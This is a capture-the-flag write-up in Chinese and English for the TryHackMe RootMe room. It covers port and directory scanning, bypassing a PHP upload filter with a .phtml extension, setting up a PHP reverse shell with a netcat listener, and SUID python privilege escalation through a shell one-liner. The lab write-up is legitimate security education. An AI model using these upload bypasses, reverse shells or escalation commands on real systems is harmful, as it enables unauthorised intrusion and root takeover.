# RootMe Write-up | 报告
<details>
  <summary>Click to view in Chinese (点击查看中文版)</summary>

---

这是我对 [RootMe](https://tryhackme.com/room/rrootme) 房间的write-up。

# 概述

这个房间是关于基础侦察和漏洞利用的。它一开始包含简单的任务，但在漏洞利用阶段会变得稍微困难一些，我们需要获取反向shell并提升权限。

# 侦察

这里有四个问题：

1. **"扫描机器，有多少个端口是开放的？"**；

2. **"运行的是什么版本的 Apache？"**；

3. **"22 端口上运行的是什么服务？"**；

**"使用 GoBuster 工具查找 Web 服务器上的目录。"**；（不一定非要用 GoBuster）

4. **"隐藏目录是什么？"**。

获取到机器IP后，我们可以使用 Nmap 扫描它以搜索开放端口：

> Nmap（Network Mapper）是一款免费、开源的网络扫描工具，用于主机发现、端口扫描、服务检测、操作系统指纹识别和安全审计。

```
nmap -sC -sV machine_ip
```

确保使用 `-sV` 参数进行服务版本检测，因为在其中一个任务中我们必须写出正在运行的 Apache 版本。

我们得到了两个开放端口：22（ssh）和 80（http）。Apache 版本是 2.4.41。现在让我们使用 ffuf 工具而不是 GoBuster 来查找隐藏目录。

> 在复杂的 Web 模糊测试中，ffuf 通常被认为比 Gobuster 更好，因为它具有灵活性和高级过滤功能。虽然这两个工具都很快并且用 Go 编写，但 ffuf 使用 FUZZ 关键字，可以放在 HTTP 请求的任何位置（URL、标头、正文、参数），而 Gobuster 主要用于将路径附加到 URL。

```
ffuf -u http://machine_ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

然后我找到了"panel"目录。

## 总结：

**"有多少个端口是开放的？"** - 2

**"运行的是什么版本的 Apache？"** - 2.4.41

**"22 端口上运行的是什么服务？"** - ssh

**"隐藏目录是什么？"** - `/panel/`

# 漏洞利用
## 获取 shell

**"找到一个上传表单并获取反向shell，然后找到flag（user.txt）。"**

我们找到了隐藏目录 `/panel/`，来看看它：`http://machine_ip/panel`

这里我们可以上传文件，所以现在我们需要找到一个表单来获取反向shell。

我在网上搜索了"reverse shell php"，找到了来自 [pentestmonkey](https://github.com/pentestmonkey) 的这个表单：https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

下载"php-reverse-shell.php"文件并查看它的代码。

我们有两个需要修改的字段：`$ip` 和 `$port`

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```

打开你的终端，运行 `ip a` 获取你的IP地址，复制并粘贴到 `$ip` 字段。至于 `$port`——你实际上不需要修改它。

之后，再次访问 `http://machine_ip/panel` 页面，按"Browse..."按钮上传php文件，然后按"Upload"。

我们收到了"PHP não é permitido!"错误消息，意思是"PHP 不被允许！"。所以我们需要通过更改文件格式来绕过它。把文件格式改成 `.phtml`，它和 `.php` 几乎一样。这个技巧在CTF中经常用来绕过对PHP文件的封锁。现在再次尝试上传文件。

完成了，我们看到"O arquivo foi upado com sucesso!"，意思是"文件上传成功！"，在它下面我们需要按"Veja!"按钮，意思是"查看！"。

我们会看到"WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) "错误页面，为了让它工作并获取反向shell，我们还需要用 netcat 工具建立连接。在你的终端中运行这个命令：

> Netcat（通常缩写为 nc）是一个多功能命令行实用程序，旨在使用 TCP 或 UDP 协议通过网络连接读取和写入数据。netcat 反向shell允许目标系统连接回攻击者的机器，通过发起出站连接来绕过入站防火墙限制。

```
nc -lvp 1234
```

> `-l` 参数让 Netcat 进入监听模式以接受传入连接，`-v` 参数启用详细输出以显示连接详细信息，`-p` 参数指定要监听的本地端口。

在它运行的同时，重新加载页面并观察你的终端。

现在我们进去了，你可以通过运行 `whoami` 命令来检查。你将是 `www-data`。

我们需要找到 `user.txt` flag，所以我运行了这个命令：

```
find / -type f -name "user.txt" 2>/dev/null
```

> 在命令末尾使用 `2>/dev/null` 可以避免看到所有错误消息。

我得到了 `/var/www/user.txt` 输出。让我们用 `cat` 读取它：

```
cat /var/www/user.txt
```

它揭示了第一个flag。

## 权限提升
1. **"搜索具有 SUID 权限的文件，哪个文件很奇怪？"**

**"找到一个表单来提升你的权限。"**

2. **（并找到）"root.txt"**

让我们搜索具有 SUID 权限的文件：
> SUID 到底是什么？它是一种设置，确保程序以特定用户的权限运行，无论实际执行它的是谁。所以如果程序具有 SUID 权限并且它属于 root，任何人都可以执行它。

我运行了这个命令：

```
find / -type f -perm -4000
```

> `-perm -4000` 是一个参数，用于仅搜索具有 SUID 权限的文件。

我得到了很多输出。这里最危险的文件是"/usr/bin/python2.7"，这意味着任何人都可以执行 python 文件。任何 python 文件。这就是我们提升权限的方法。我们需要为此找到 python 表单。这里有一个有用的网站：[GTFObins](https://gtfobins.org/)
> GTFOBins 是一个精心整理的类 Unix 可执行文件列表，可用于在配置错误的系统中绕过本地安全限制。

找到"python"，然后点击"shell" > "SUID"。你会看到这个命令：

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

在我们获得的shell中运行它。然后运行 `whoami` 检查是否成功。你现在应该是 root 了。

然后就像我们对 `user.txt` 所做的那样，我们需要搜索 `root.txt`：

```
find / -type f -name "root.txt" 2>/dev/null
```

`root.txt` flag 在 `/root/root.txt` 路径中。用 `cat` 读取它。

## 经验教训

这个挑战非常适合渗透测试初学者。它教你如何使用 Nmap 进行侦察、通过表单获取shell以及通过表单提升权限。对我来说，表单部分是最有趣的。我还学到了关于 `.php` 文件的新知识，即你可以通过将文件格式改为 `.phtml` 来绕过 `.php` 过滤器。

  </details>

---

This is my write-up for the [RootMe](https://tryhackme.com/room/rrootme) room. 

# Overview

This room is about basic reconnaissance and exploitation. It contains simple tasks first, but at the exploitation phase it gets a little more difficult, we need to get reverse shell and elevate our priviliges. 

# Reconnaissance

We got four questions here:

1. **"Scan the machine, how many ports are open?"**;

2. **"What version of Apache is running?"**;

3. **"What service is running on port 22?"**;

**"Find directories on the web server using the GoBuster tool."**; (not necessarily GoBuster)

4. **"What is the hidden directory?"**.

After getting machine IP, we can scan it to search for open ports using Nmap:

> Nmap (Network Mapper) is a free, open-source network scanning tool used for host discovery, port scanning, service detection, operating system fingerprinting, and security auditing.

```
nmap -sC -sV machine_ip
```

Make sure to use `-sV` command for service version detection, because in one of the tasks we have to write the version of the Apache running.

We got two open ports: 22 (ssh) and 80 (http). Apache version is 2.4.41 . Now let's find the hidden directory using ffuf tool, not GoBuster.

 > ffuf is generally considered better than Gobuster for complex web fuzzing due to its flexibility and advanced filtering capabilities.  While both tools are fast and written in Go, ffuf utilizes a FUZZ keyword that can be placed anywhere in an HTTP request (URL, headers, body, parameters), whereas Gobuster is primarily designed for appending paths to URLs.

```
ffuf -u http://machine_ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

And I found the "panel" directory.

## Summary:

**..how many ports are open?"** - 2

**"What version of Apache is running?"** - 2.4.41

**"What service is running on port 22?"** - ssh

**"What is the hidden directory?"** - `/panel/`

# Exploitation
## Getting a shell

**"Find a form to upload and get a reverse shell, and find the flag (user.txt)."**

We found hidden directory `/panel/`, lets check it: `http://machine_ip/panel`

Here we can upload a file, so now we need to find a form to get a reverse shell. 

I browsed internet for "reverse shell php" and found this form from [pentestmonkey](https://github.com/pentestmonkey): https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Download the "php-reverse-shell.php" file and take a look at its code.

We have two fields that we need to change: `$ip` & `$port`

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
```

Open your terminal, run `ip a` to get your IP address, copy it and paste to the `$ip` field. About `$port` - you don't really have to change it.

After that, go to `http://machine_ip/panel` page again, and press "Browse..." button to upload the php file, then press "Upload".

We're getting "PHP não é permitido!" error message, which means "PHP is not allowed!". So we need to bypass it by changing the file format. Change file's format to `.phtml`, it is almost the same as `.php `. This trick often used in CTFs to bypass blocking of PHP files. Now try to upload the file again.

And it's done, we see "O arquivo foi upado com sucesso!", which means "The file was successfully uploaded!", and below it we need to press the "Veja!" button, which means "Look!".

We'll see "WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) " error page, to make it work and get a reverse shell we also need to set up the connection with netcat tool. Run this command in your terminal:

> Netcat (often abbreviated as nc) is a versatile command-line utility designed to read and write data across network connections using TCP or UDP protocols. A netcat reverse shell allows a target system to connect back to an attacker's machine, bypassing inbound firewall restrictions by initiating an outbound connection.

```
nc -lvp 1234
```

> The `-l` flag puts Netcat in listen mode to accept incoming connections, the `-v` flag enables verbose output to show connection details, and the `-p` flag specifies the local port to listen on.

And while its running, reload the page and watch to your terminal.

Now we're in, you can check it by running `whoami` command. You'll be `www-data`.

We need to find `user.txt` flag, so I ran this command:

```
find / -type f -name "user.txt" 2>/dev/null
```

> Use `2>/dev/null` at the end of a command to not to see all error messages.

I got `/var/www/user.txt` output. Let's read it with `cat`:

```
cat /var/www/user.txt
```

And it reveals the first flag.

## Privilege Escalation
1. **"Search for files with SUID permission, which file is weird?"**

**"Find a form to escalate your privileges."**

2. **(And find) "root.txt"**

Let's search for files with SUID permission:
> What exactly is SUID? It is a setting that ensures a program runs with the privileges of a specific user, regardless of who actually executes it. So if the program have a SUID permission and it is owned by root, anyone can execute it.

I ran this command:

```
find / -type f -perm -4000
```

> `-perm -4000` is a flag to search for files only with SUID permission.

And I got a lot of output. The "/usr/bin/python2.7" file is the most dangerous here, it means that anyone can execute a python file. Any python file. This is our way to elevate privileges. We need to find the python form for this. Here's useful site: [GTFObins](https://gtfobins.org/)
> GTFOBins is a curated list of Unix-like executables that can be used to bypass local security restrictions in misconfigured systems.

Find "python", then click "shell" > "SUID". You'll see this command:

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Run it in the shell that we got. Then run `whoami` to check if it worked. You need to be root now.

Then just we did with `user.txt`, we need to search for `root.txt`:

```
find / -type f -name "root.txt" 2>/dev/null
```

And the `root.txt` flag is in `/root/root.txt` path. Read it with `cat`.

## Lessons Learned

This challenge is perfect for pentest beginners. It teaches you how to recon using Nmap, getting a shell with a form and elevate privileges with form. The form parts was the most interesting as for me. Also I learned a new thing about `.php` files, that you can bypass `.php` filter just by changing the format of the file to `.phtml`.
